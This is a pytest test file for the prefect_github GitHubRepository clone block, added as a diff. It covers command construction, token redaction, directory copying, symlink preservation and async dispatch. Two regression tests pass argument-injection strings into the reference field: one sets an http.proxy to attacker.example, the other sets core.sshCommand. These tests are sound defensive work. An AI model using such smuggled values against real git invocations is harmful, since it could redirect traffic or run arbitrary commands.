@@ -1,0 +1,384 @@
+import os
+from pathlib import Path
+from tempfile import TemporaryDirectory
+from typing import Coroutine, Tuple
+from unittest.mock import AsyncMock
+
+import prefect_github
+import pytest
+from prefect_github import GitHubCredentials
+from prefect_github.repository import GitHubRepository
+
+
+class TestGitHubRepository:
+    async def test_subprocess_errors_are_surfaced(self):
+        """Ensure that errors from GitHub are being surfaced to users."""
+        g = GitHubRepository(repository_url="incorrect-url-scheme")
+        with pytest.raises(
+            RuntimeError,
+            match="fatal: repository 'incorrect-url-scheme' does not exist",
+        ):
+            await g.get_directory()
+
+    async def test_repository_default(self, monkeypatch):
+        """Ensure that default command is 'git clone <repo name>' when given just
+        a repo.
+        """
+
+        class p:
+            returncode = 0
+
+        mock = AsyncMock(return_value=p())
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+        g = GitHubRepository(repository_url="prefect")
+        await g.get_directory()
+
+        assert mock.await_count == 1
+        assert ["git", "clone", "prefect"] == mock.await_args[0][0][:3]
+
+    async def test_reference_default(self, monkeypatch):
+        """Ensure that default command is 'git clone <repo name> -b <reference> --depth 1'  # noqa: E501
+        when just a repository and reference are given.
+        """
+
+        class p:
+            returncode = 0
+
+        mock = AsyncMock(return_value=p())
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+        g = GitHubRepository(repository_url="prefect", reference="2.0.0")
+        await g.get_directory()
+
+        assert mock.await_count == 1
+        assert "git clone prefect -b 2.0.0 --depth 1" in " ".join(mock.await_args[0][0])
+
+    async def test_token_added_correctly_from_credential(self, monkeypatch):
+        """Ensure that the repo url is in the format `https://<oauth-key>@github.com/<username>/<repo>.git`."""  # noqa: E501
+
+        class p:
+            returncode = 0
+
+        mock = AsyncMock(return_value=p())
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+        credential = GitHubCredentials(token="XYZ")
+        g = GitHubRepository(
+            repository_url="https://github.com/PrefectHQ/prefect.git",
+            credentials=credential,
+        )
+        await g.get_directory()
+        assert mock.await_count == 1
+        assert (
+            "git clone https://XYZ@github.com/PrefectHQ/prefect.git --depth 1"
+            in " ".join(mock.await_args[0][0])
+        )
+
+    async def test_get_directory_redacts_token_in_error(self, monkeypatch):
+        """Ensure GitHub access tokens are not surfaced in git error messages."""
+
+        class p:
+            returncode = 1
+
+        async def mock(cmd, stream_output=None, **kwargs):
+            if stream_output:
+                _, err_stream = stream_output
+                err_stream.write(
+                    "fatal: Authentication failed for "
+                    "'https://XYZ@github.com/PrefectHQ/prefect.git/'"
+                    "\nremote: token XYZ rejected"
+                )
+            return p()
+
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+        credential = GitHubCredentials(token="XYZ")
+        g = GitHubRepository(
+            repository_url="https://github.com/PrefectHQ/prefect.git",
+            credentials=credential,
+        )
+        with pytest.raises(RuntimeError) as excinfo:
+            await g.get_directory()
+
+        message = str(excinfo.value)
+        assert "XYZ" not in message
+        assert "https://github.com/PrefectHQ/prefect.git" in message
+
+    async def test_clone_error_with_credentials_but_no_token(self, monkeypatch):
+        """Ensure that a clone failure with GitHubCredentials(token=None) raises
+        the original sanitized error, not an AttributeError from
+        _git_error_extra_secrets.
+        """
+
+        class p:
+            returncode = 1
+
+        async def mock(cmd, stream_output=None, **kwargs):
+            if stream_output:
+                _, err_stream = stream_output
+                err_stream.write(
+                    "fatal: repository 'https://github.com/no/repo.git' not found"
+                )
+            return p()
+
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+        g = GitHubRepository(
+            repository_url="https://github.com/no/repo.git",
+            credentials=GitHubCredentials(),
+        )
+        with pytest.raises(RuntimeError, match="Failed to pull from remote"):
+            await g.get_directory()
+
+    def setup_test_directory(
+        self, tmp_src: str, sub_dir: str = "puppy"
+    ) -> Tuple[str, str]:
+        """Add files and directories to a temporary directory. Returns a tuple with the
+        expected parent-level contents and the expected child-level contents.
+        """
+        # add file to tmp_src
+        f1_name = "dog.text"
+        f1_path = Path(tmp_src) / f1_name
+        f1 = open(f1_path, "w")
+        f1.close()
+
+        # add sub-directory to tmp_src
+        sub_dir_path = Path(tmp_src) / sub_dir
+        os.mkdir(sub_dir_path)
+
+        # add file to sub-directory
+        f2_name = "cat.txt"
+        f2_path = sub_dir_path / f2_name
+        f2 = open(f2_path, "w")
+        f2.close()
+
+        parent_contents = {f1_name, sub_dir}
+        child_contents = {f2_name}
+
+        assert set(os.listdir(tmp_src)) == parent_contents
+        assert set(os.listdir(sub_dir_path)) == child_contents
+
+        return parent_contents, child_contents
+
+    class MockTmpDir:
+        """Utility for having `TemporaryDirectory` return a known location."""
+
+        dir = None
+
+        def __init__(self, *args, **kwargs):
+            pass
+
+        def __enter__(self):
+            return self.dir
+
+        def __exit__(self, *args, **kwargs):
+            pass
+
+    async def test_dir_contents_copied_correctly_with_get_directory(self, monkeypatch):  # noqa
+        """Check that `get_directory` is able to correctly copy contents from src->dst"""  # noqa
+
+        class p:
+            returncode = 0
+
+        mock = AsyncMock(return_value=p())
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+
+        sub_dir_name = "puppy"
+
+        with TemporaryDirectory() as tmp_src:
+            parent_contents, child_contents = self.setup_test_directory(
+                tmp_src, sub_dir_name
+            )
+            self.MockTmpDir.dir = tmp_src
+
+            # move file contents to tmp_dst
+            with TemporaryDirectory() as tmp_dst:
+                monkeypatch.setattr(
+                    prefect_github.repository,
+                    "TemporaryDirectory",
+                    self.MockTmpDir,
+                )
+
+                g = GitHubRepository(
+                    repository_url="https://github.com/PrefectHQ/prefect.git",
+                )
+                await g.get_directory(local_path=tmp_dst)
+
+                assert set(os.listdir(tmp_dst)) == parent_contents
+                assert set(os.listdir(Path(tmp_dst) / sub_dir_name)) == child_contents
+
+    async def test_dir_contents_copied_correctly_with_get_directory_and_from_path(
+        self, monkeypatch
+    ):  # noqa
+        """Check that `get_directory` is able to correctly copy contents from src->dst
+        when `from_path` is included.
+
+        It is expected that the directory specified by `from_path` will be moved to the
+        specified destination, along with all of its contents.
+        """
+
+        class p:
+            returncode = 0
+
+        mock = AsyncMock(return_value=p())
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+
+        sub_dir_name = "puppy"
+
+        with TemporaryDirectory() as tmp_src:
+            parent_contents, child_contents = self.setup_test_directory(
+                tmp_src, sub_dir_name
+            )
+            self.MockTmpDir.dir = tmp_src
+
+            # move file contents to tmp_dst
+            with TemporaryDirectory() as tmp_dst:
+                monkeypatch.setattr(
+                    prefect_github.repository,
+                    "TemporaryDirectory",
+                    self.MockTmpDir,
+                )
+
+                g = GitHubRepository(
+                    repository_url="https://github.com/PrefectHQ/prefect.git",
+                )
+                await g.get_directory(local_path=tmp_dst, from_path=sub_dir_name)
+
+                assert set(os.listdir(tmp_dst)) == set([sub_dir_name])
+                assert set(os.listdir(Path(tmp_dst) / sub_dir_name)) == child_contents
+
+    async def test_reference_is_not_split_on_whitespace(self, monkeypatch):
+        """A reference containing spaces must be passed as a single argument so
+        that an attacker cannot inject additional git options via the
+        `reference` field (BOUNTY-343).
+        """
+
+        class p:
+            returncode = 0
+
+        mock = AsyncMock(return_value=p())
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+
+        malicious_reference = "main -c http.proxy=http://attacker.example:8080"
+        g = GitHubRepository(
+            repository_url="https://github.com/PrefectHQ/prefect.git",
+            reference=malicious_reference,
+        )
+        await g.get_directory()
+
+        assert mock.await_count == 1
+        cmd = mock.await_args[0][0]
+        assert "-c" not in cmd
+        assert "http.proxy=http://attacker.example:8080" not in cmd
+        assert malicious_reference in cmd
+        assert cmd[cmd.index("-b") + 1] == malicious_reference
+
+    def test_reference_is_not_split_on_whitespace_sync(self, monkeypatch):
+        """Sync counterpart of the argument-injection regression test."""
+        import subprocess
+        from unittest.mock import MagicMock
+
+        mock_result = MagicMock()
+        mock_result.returncode = 0
+        mock_result.stderr = ""
+        run_mock = MagicMock(return_value=mock_result)
+        monkeypatch.setattr(subprocess, "run", run_mock)
+
+        malicious_reference = "main -c core.sshCommand=evil"
+        g = GitHubRepository(
+            repository_url="git@github.com:PrefectHQ/prefect.git",
+            reference=malicious_reference,
+        )
+        g.get_directory()
+
+        assert run_mock.call_count == 1
+        cmd = run_mock.call_args[0][0]
+        assert "-c" not in cmd
+        assert "core.sshCommand=evil" not in cmd
+        assert malicious_reference in cmd
+        assert cmd[cmd.index("-b") + 1] == malicious_reference
+
+    async def test_get_directory_preserves_symlinks(self, monkeypatch):
+        """Test that get_directory preserves symlinks instead of following them.
+
+        This verifies the fix for issue #7868 where symlinks were being resolved
+        and their target files copied, potentially exposing sensitive files.
+        """
+
+        class p:
+            returncode = 0
+
+        mock = AsyncMock(return_value=p())
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+
+        with TemporaryDirectory() as tmp_src:
+            # Create a real file
+            real_file = Path(tmp_src) / "real_file.txt"
+            real_file.write_text("real content")
+
+            # Create a symlink
+            symlink_file = Path(tmp_src) / "link_file.txt"
+            symlink_file.symlink_to(real_file)
+
+            self.MockTmpDir.dir = tmp_src
+
+            with TemporaryDirectory() as tmp_dst:
+                monkeypatch.setattr(
+                    prefect_github.repository,
+                    "TemporaryDirectory",
+                    self.MockTmpDir,
+                )
+
+                g = GitHubRepository(
+                    repository_url="https://github.com/PrefectHQ/prefect.git",
+                )
+                await g.get_directory(local_path=tmp_dst)
+
+                # Verify the symlink is preserved as a symlink
+                copied_symlink = Path(tmp_dst) / "link_file.txt"
+                assert copied_symlink.is_symlink(), (
+                    "Symlink should be preserved as a symlink"
+                )
+
+                # Verify the real file is copied
+                copied_real = Path(tmp_dst) / "real_file.txt"
+                assert copied_real.exists()
+                assert copied_real.read_text() == "real content"
+
+
+class TestGitHubRepositoryAsyncDispatch:
+    """Tests for GitHubRepository.get_directory migrated from @sync_compatible to @async_dispatch.
+
+    These tests verify the critical behavior from issue #15008 where
+    @sync_compatible would incorrectly return coroutines in sync context.
+    """
+
+    def test_get_directory_sync_context_returns_none_not_coroutine(self, monkeypatch):
+        """get_directory must return None (not coroutine) in sync context.
+
+        This is the critical regression test for issues #14712 and #14625.
+        """
+        import subprocess
+        from unittest.mock import MagicMock
+
+        mock_result = MagicMock()
+        mock_result.returncode = 0
+        mock_result.stderr = ""
+        monkeypatch.setattr(subprocess, "run", MagicMock(return_value=mock_result))
+
+        g = GitHubRepository(repository_url="prefect")
+        result = g.get_directory()
+
+        assert not isinstance(result, Coroutine), "sync context returned coroutine"
+        assert result is None
+
+    async def test_get_directory_async_context_returns_coroutine(self, monkeypatch):
+        """get_directory should dispatch to async and return coroutine in async context."""
+
+        class p:
+            returncode = 0
+
+        mock = AsyncMock(return_value=p())
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+
+        g = GitHubRepository(repository_url="prefect")
+        result = g.get_directory()
+
+        assert isinstance(result, Coroutine)
+        await result  # should complete without error
